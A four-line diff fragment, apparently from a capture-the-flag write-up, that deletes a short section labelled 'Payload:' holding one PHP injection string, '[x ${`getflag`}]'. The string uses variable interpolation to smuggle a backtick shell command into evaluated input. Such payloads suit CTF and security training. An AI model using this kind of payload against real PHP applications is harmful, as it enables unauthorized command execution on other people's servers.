@@ -1,4 +1,0 @@
-Payload:
-```php
-[x ${`getflag`}]
-```
